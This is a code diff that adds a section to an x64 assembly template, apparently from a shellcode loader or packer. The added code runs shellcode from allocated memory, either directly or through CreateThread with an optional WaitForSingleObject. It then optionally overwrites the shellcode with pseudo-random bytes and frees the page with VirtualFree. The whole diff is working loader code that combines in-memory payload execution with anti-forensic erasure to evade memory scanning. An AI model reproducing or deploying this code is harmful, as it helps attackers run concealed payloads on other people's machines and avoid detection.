@@ -402,6 +402,87 @@ entry:
   pop esi                                      {{igi}}
 {{end}} // SectionMode
 
+// ================================== execute shellcode ==================================
+
+{{if .NeedCreateThread}}
+  {{if .NeedJumper}}
+    mov r10, {{.RegN.rdi}}                     {{igi}} // address of image base
+    add r10, {{hex .JumperOffset}}             {{igi}} // address of jumper
+    mov r11, [rsp+0x08]                        {{igi}} // address of memory page
+    add r11, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+  {{else}}
+    mov r10, [rsp+0x08]                        {{igi}} // address of memory page
+    add r10, {{hex .EntryOffset}}              {{igi}} // address of shellcode
+  {{end}}
+
+  mov rax, [rsp+0x28]                          {{igi}} // address of CreateThread
+
+  sub rsp, 0x10                                {{igi}} // reserve stack for argument
+  xor rcx, rcx                                 {{igi}} // lpThreadAttributes
+  xor rdx, rdx                                 {{igi}} // dwStackSize
+  mov r8, r10                                  {{igi}} // lpStartAddress
+  mov r9, r11                                  {{igi}} // lpParameter
+  mov [rsp+0], rcx                             {{igi}} // dwCreationFlags
+  mov [rsp+8], rcx                             {{igi}} // lpThreadId
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call CreateThread
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
+  add rsp, 0x10                                {{igi}} // restore stack for argument
+
+  {{if .NeedWaitThread}}
+    mov rcx, rax                               {{igi}} // hHandle, hThread
+    mov rdx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
+    mov rax, [rsp+0x30]                        {{igi}} // address of WaitForSingleObject
+    sub rsp, 0x20                              {{igi}} // reserve stack for call convention
+    call rax                                   {{igi}} // call WaitForSingleObject
+    add rsp, 0x20                              {{igi}} // restore stack for call convention
+  {{end}}
+{{else}}
+  mov {{.RegV.rax}}, [rsp+0x08]                {{igi}} // address of allocated memory
+  add {{.RegV.rax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call {{.RegV.rax}}                           {{igi}} // call shellcode
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
+{{end}}
+
+// =================================== erase shellcode ===================================
+
+{{if .NeedEraseShellcode}}
+  // overwrite memory data
+  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
+  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
+  // calculate a random seed from registers
+  add {{.RegV.rax}}, rsp                       {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rsi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r8}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r9}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r10}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r11}}              {{igi}}
+ loop_erase:
+  // it will waste some loop but clean code
+  call xor_shift                               {{igi}}
+  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{igi}}
+  // check erase instruction is finish
+  inc {{.RegV.rdx}}                            {{igi}}
+  dec {{.RegV.rcx}}                            {{igi}}
+  jnz loop_erase                               {{igi}}
+
+  // release allocated memory page
+  mov rax, [rsp+0x18]                          {{igi}} // address of VirtualFree
+  mov rcx, [rsp+0x08]                          {{igi}} // address of allocated memory
+  xor rdx, rdx                                 {{igi}} // dwSize
+  mov r8, 0x8000                               {{igi}} // dwFreeType MEM_RELEASE
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call VirtualFree
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
+{{end}}
+
 // ================================== clean environment ==================================
 
   // restore stack for store variables
